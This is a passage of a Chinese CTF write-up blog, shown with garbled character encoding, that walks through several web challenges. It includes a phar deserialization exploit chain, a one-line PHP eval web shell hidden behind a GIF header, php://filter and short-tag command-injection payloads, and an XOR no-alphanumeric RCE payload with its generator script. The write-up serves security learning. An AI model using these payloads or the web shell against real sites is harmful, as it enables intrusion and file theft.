title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>è¿™é¢˜å¾ˆç®€å•ï¼Œè¿›å»åæˆ‘ä»¬åªæœ‰50å…ƒä½†æ˜¯æœ‰ä¸€ä¸ª100å…ƒçš„æ›²å¥‡</p><p>çŒœæµ‹è´­ä¹°è¿™ä¸ªæ›²å¥‡è·å¾—flag</p><p>ç‚¹å‡»è´­ä¹°å¹¶æŠ“åŒ…</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164344642.png" alt="image-20220330164344642"></p><p>seesionå¾ˆåƒbase64åŠ å¯†</p><p>è§£å¯†ä¸€ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164431797.png" alt="image-20220330164431797"></p><p>ä¿®æ”¹ä¸‹moneyç„¶åå†base64åŠ å¯†</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164507027.png" alt="image-20220330164507027"></p><p>è´­ä¹°100å…ƒçš„æ›²å¥‡ï¼Œæ›¿æ¢åŸæœ‰çš„cookie</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164535408.png" alt="image-20220330164535408"></p><p>æˆåŠŸè·å¾—flag</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>ç‚¹å‡»æŸ¥çœ‹æ–‡ä»¶</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=</code></pre><p>è§‚å¯Ÿurlï¼Œå¾ˆå¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«ï¼Œè¯»å–ä¸‹å„ä¸ªæ–‡ä»¶æºç </p><p>index.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;base.php&#39;;?&gt; </code></pre><p>base.php</p><pre><code class="php">&lt;?php     session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;     &lt;meta charset=&quot;utf-8&quot;&gt;     &lt;title&gt;web3&lt;/title&gt;     &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt;     &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;     &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt;     &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt;         &lt;div class=&quot;container-fluid&quot;&gt;         &lt;div class=&quot;navbar-header&quot;&gt;             &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;é¦–é¡µ&lt;/a&gt;         &lt;/div&gt;             &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt;                 &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;/a&gt;&lt;/li&gt;                 &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;             &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt;                 &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;         &lt;/div&gt;     &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt;</code></pre><p>file.php</p><pre><code class="php">é¦–é¡µ    æŸ¥çœ‹æ–‡ä»¶    ä¸Šä¼ æ–‡ä»¶    10.244.80.46&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt;  </code></pre><p>upload_file.php</p><pre><code class="php">222.90.67.205&lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=&quot;utf-8&quot;&gt; &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = &quot;center&quot;&gt;         &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt;     p&#123; margin:0 auto&#125; &lt;/style&gt; &lt;div&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;     &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶å:&lt;/label&gt;     &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;     &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;</code></pre><p>function.php</p><pre><code class="php">222.90.67.205&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt; </code></pre><p>æˆ‘ä»¬æ˜¯æ— æ³•åˆ©ç”¨æ–‡ä»¶è¯»å–æ¥è¯»å–flagçš„ã€‚class.phpä¸€çœ‹å°±æ˜¯ååºåˆ—åŒ–ï¼Œä½†æ˜¯æ‰€æœ‰çš„ä»£ç é‡Œé¢éƒ½æ²¡æœ‰unserializeæ–¹æ³•ã€‚æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä¸”pharåè®®æ²¡æœ‰è¿‡æ»¤ï¼Œé‚£ä¹ˆå°±åº”è¯¥è€ƒå¯Ÿçš„æ˜¯åˆ©ç”¨pharåè®®æ¥è¿›è¡Œååºåˆ—åŒ–é€ƒé€¸ï¼Œé‚£æˆ‘ä»¬å°±è¦å°è¯•æ¥æ„é€ pocé“¾ã€‚</p><p>é¦–å…ˆç¡®å®šç»ˆç‚¹ï¼Œå®ƒåº”è¯¥æ˜¯å¯ä»¥è¯»å–æ–‡ä»¶çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬é”å®šfile_getæ–¹æ³•</p><pre><code>$text = base64_encode(file_get_contents($value));</code></pre><p>æˆ‘ä»¬å°±å¯ä»¥å‘è¿™ä¸ªæ–¹æ³•ä¸­ä¼ å…¥æˆ‘ä»¬éœ€è¦è¯»å–çš„æ–‡ä»¶è·¯å¾„å°±å¯ä»¥äº†ã€‚</p><p>æ€è·¯:</p><pre><code>å¯¹è±¡é”€æ¯ï¼Œè°ƒç”¨__destruct()æ–¹æ³•ï¼Œæœ€åä¼šechoä¸€ä¸ªå€¼ï¼Œä»¤$C1e4r-&gt;str=$Show,è¿™æ ·å°±ä¼šè°ƒç”¨showå¯¹è±¡çš„__toString()æ–¹æ³•ï¼Œå†ä»¤$Show-&gt;str[&#39;str&#39;]=$Test,testå¯¹è±¡ä¸­å¹¶æ²¡æœ‰sourceï¼Œæ‰€ä»¥ä¼šè°ƒç”¨getæ–¹æ³•ï¼Œä»¤Test-&gt;params[source] = &quot;/var/www/html/f1ag.php&quot;,å°±å¯ä»¥æˆåŠŸè¯»å–flag</code></pre><p>pocé“¾</p><pre><code class="php">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;&#125;class Test&#123;    public $file;    public $params;&#125;$c1e4r = new C1e4r();$show = new Show();$test = new Test();$c1e4r-&gt;str = $show;$show-&gt;str[&#39;str&#39;]=$test;$test-&gt;params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;;$phar = new Phar(&quot;sakura.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c1e4r);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;</code></pre><p>åœ¨æœ¬åœ°æ­å»ºphpç¯å¢ƒï¼Œç„¶åè®¿é—®ï¼Œä¼šç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214617285.png" alt="image-20220330214617285"></p><p>æ¥ä¸‹æ¥è¦æŠŠè¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œä½†æ˜¯åªå…è®¸å›¾ç‰‡è¿›è¡Œä¸Šä¼ </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214739536.png" alt="image-20220330214739536"></p><p>æ‰€ä»¥æˆ‘ä»¬æŠŠåç¼€æ”¹ä¸º.gifï¼Œè¿™å¹¶ä¸ä¼šå½±å“pharæ–‡ä»¶çš„è§£æ</p><p>æ¥ä¸‹æ¥è¦å¾—åˆ°æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„</p><pre><code>$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </code></pre><p>å¯¹æ–‡ä»¶åå’Œè¿œç¨‹åœ°å€è¿›è¡Œmd5åŠ å¯†ï¼Œåç¼€åŠ ä¸Šjpgï¼Œç”±æ­¤å¾—åˆ°æ–‡ä»¶å</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220208000.png" alt="image-20220330220208000"></p><pre><code>0b0c73463194f72e78079b81d921c8f4.jpgè·¯å¾„ä¸º:xxx/upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220359594.png" alt="image-20220330220359594"></p><p>payload</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=phar://upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220521789.png" alt="image-20220330220521789"></p><p>è§£å¯†ä¸€ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220555486.png" alt="image-20220330220555486"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>ç®€å•æ–‡ä»¶ä¸Šä¼ ï¼Œè¿›å»åæ³¨å†Œè´¦å·ï¼Œç™»å½•ã€‚</p><p>å¯ä»¥ç›´æ¥ä¸Šä¼ PHPæ–‡ä»¶</p><p>ma.php</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;x&#39;]);&lt;/script&gt;</code></pre><p>ç„¶åå¤åˆ¶å›¾ç‰‡é“¾æ¥ï¼Œåˆ°èšå‰‘ä¸­è¿æ¥</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141935935.png" alt="image-20220331141935935"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141947473.png" alt="image-20220331141947473"></p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331142206699.png" alt="image-20220331142206699"></p><p>æŸ¥çœ‹æºä»£ç </p><pre><code class="php"> &lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword = [    // no path traversal    &#39;\.\.&#39;,    // no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    // no data exfiltration    &#39;flag&#39;  ];  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body = file_get_contents(&#39;php://input&#39;); #bodyè·å–postæ•°æ®,åé¢ä¼šå¯¹è¿™è¿›è¡Œ$json = json_decode($body, true); #å¯¹è·å–å¾—æ•°æ®è¿›è¡Œè§£ç if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123; #åˆ¤æ–­bodyæ˜¯å¦æœ‰æ•ˆï¼Œæ˜¯å¦å­˜åœ¨jsonæ•°æ®ï¼Œæ˜¯å¦å­˜åœ¨json[&#39;page&#39;]æ•°æ®   $page = $json[&#39;page&#39;];  $content = file_get_contents($page); #è¯»å–pageä¸­å¾—å†…å®¹  if (!$content || !is_valid($content)) &#123;    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;  &#125;&#125; else &#123;  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;&#125;// no data exfiltration!!!$content = preg_replace(&#39;/HarekazeCTF\&#123;.+\&#125;/i&#39;, &#39;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#39;, $content);#åŒ¹é…è¿‡æ»¤å…³é”®å­—ctfecho json_encode([&#39;content&#39; =&gt; $content]); #å°†contentè¿›è¡Œjsonç¼–ç å¹¶è¾“å‡º</code></pre><p>åœ¨jsonä¸­ï¼Œå­—ç¬¦Unicodeç¼–ç ä¹‹åç­‰åŒäºè¯¥å­—ç¬¦ï¼Œæ¯”å¦‚phpç­‰åŒäº\u0070\u0068\u0070ã€‚</p><p>æ„é€ payload</p><pre><code>php://filter/read=convert.base64-encode/resource=/flag</code></pre><p>ç¼–ç ä¸‹</p><pre><code>\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331161734671.png" alt="image-20220331161734671"></p><p>è§£ç </p><pre><code>flag&#123;06495870-7a10-4628-b799-e860b1b58477&#125;</code></pre><h2 id="çº¢æ˜è°·CTF-2021-write-shell"><a href="#çº¢æ˜è°·CTF-2021-write-shell" class="headerlink" title="[çº¢æ˜è°·CTF 2021]write_shell"></a>[çº¢æ˜è°·CTF 2021]write_shell</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;        // if(preg_match(&quot;/&#39;| |_|=|php/&quot;,$input))&#123;        die(&#39;hacker!!!&#39;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key=&gt;$output)&#123;          $input[$key] = waf($output);      &#125;  &#125;else&#123;      $input = check($input);  &#125;&#125;$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#39;pwd&#39;:        echo $dir;        break;    case &#39;upload&#39;:        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>ä»£ç å®¡è®¡</p><p><code>$a ?? 0 ç­‰åŒäº isset($a) ? $a : 0ã€‚</code></p><p>é¦–å…ˆçˆ†å‡ºè·¯å¾„</p><pre><code class="php">http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=pwd/sandbox/cc551ab005b2e60fbdc88de809b2c4b1/index.php</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331214929182.png" alt="image-20220331214929182"></p><p>è¿™é“é¢˜è€ƒå¯Ÿçš„å°±æ˜¯shellçš„å†™å…¥ï¼Œä½†æ˜¯å®ƒè¿‡æ»¤äº†ä¸å°‘å…³é”®è¯</p><p>å…¶ä¸­è¿‡æ»¤äº†phpè¿™ä¸ªå…³é”®è¯ï¼Œä½†æ˜¯è¿™ä¸ªå¯ä»¥è¿›è¡Œç»•è¿‡</p><pre><code>PHPä¸­æœ‰ä¸¤ç§çŸ­æ ‡ç­¾ï¼Œ&lt;??&gt;å’Œ&lt;?=?&gt;ã€‚å…¶ä¸­ï¼Œ&lt;??&gt;ç›¸å½“äºå¯¹&lt;?php&gt;çš„æ›¿æ¢ã€‚è€Œ&lt;?=?&gt;åˆ™æ˜¯ç›¸å½“äº&lt;? echo&gt;å¤§éƒ¨åˆ†æ–‡ç« è¯´çŸ­æ ‡ç­¾éœ€è¦åœ¨php.iniä¸­è®¾ç½®short_open_tagä¸ºonæ‰èƒ½å¼€å¯çŸ­æ ‡ç­¾(é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œä½†ä¼¼ä¹åˆé»˜è®¤æ³¨é‡Šï¼Œæ‰€ä»¥è¿˜æ˜¯ç­‰äºæ²¡å¼€å¯)ã€‚ä½†å®é™…ä¸Šåœ¨PHP5.4ä»¥åï¼Œæ— è®ºshort_open_tagæ˜¯å¦å¼€å¯ï¼Œ&lt;?=?&gt;è¿™ç§å†™æ³•æ€»æ˜¯é€‚ç”¨çš„ï¼Œ&lt;??&gt;è¿™ç§å†™æ³•åˆ™éœ€è¦short_open_tagå¼€å¯æ‰è¡Œã€‚</code></pre><pre><code>è¿‡æ»¤äº†ç©ºæ ¼â€˜ â€™å¯ä»¥ç”¨ \tæˆ–è€…%09(éœ€è¦phpç¯å¢ƒ) ä»£æ›¿</code></pre><p>æ„é€ payload</p><pre><code>http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=upload&amp;data=&lt;?=%09`cat%09/*`?&gt;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331225308163.png" alt="image-20220331225308163"></p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre><code class="php">&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#39;_&#39;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>ä»£ç å®¡è®¡</p><p>æºç è´´ä¸Šæ¥ï¼š</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150538110.png" alt="image-20220210150538110"></a></p><p>ä»£ç å…¶å®å¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯rceã€‚</p><p>æˆ‘ä»¬å…ˆæ¥å°è¯•ä¸€ä¸‹rceï¼Œå¥½å®¶ä¼™ï¼Œè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿å•Šã€‚</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150849473.png" alt="image-20220210150849473"></a></p><p>ç”±æ­¤åˆ¤æ–­ï¼Œè¿™æ˜¯æ— å­—æ¯æ— æ•°å­—rceï¼Œæœ‰ä¸‰ä¸ªæ€è·¯</p><p>1ã€å¼‚æˆ–</p><p>2ã€å–å</p><p>3ã€è‡ªå¢</p><p>ç”±äºè¿™é‡Œå¯¹å­—ç¬¦çš„é•¿åº¦æœ‰é™åˆ¶</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150949879.png" alt="image-20220210150949879"></a></p><p>æ•…é‡‡ç”¨å¼‚æˆ–ã€‚</p><p>è¿™é‡Œè´´ä¸Šå¤§ç¥çš„è„šæœ¬</p><pre><code>&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>è¿è¡Œå¦‚å›¾</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210151113658.png" alt="image-20220210151113658"></a></p><p>ç”±æ­¤æˆ‘ä»¬å¯æ„é€ payloadï¼š</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=phpinfo```[![image-20220210152555350](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210152555350.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png)æˆåŠŸå‡ºæ¥phpinfoï¼Œçœ‹ä¸€çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹[![image-20220210152650640](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210152650640.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png)å‘ç°æ‰§è¡Œç³»ç»Ÿçš„å‘½ä»¤å…¨è¢«ç¦ç”¨äº†ï¼Œçœ‹æ¥rceèµ°ä¸é€šäº†ã€‚è¿™é‡Œé¡ºå¸¦æä¸€å˜´ï¼Œåœ¨buuçš„ç¯å¢ƒä¸­å­˜åœ¨éé¢„æœŸè§£ï¼Œflagç›´æ¥åœ¨phpinfoé‡Œäº†[![image-20220210152821670](ctfåˆ·é¢˜-ç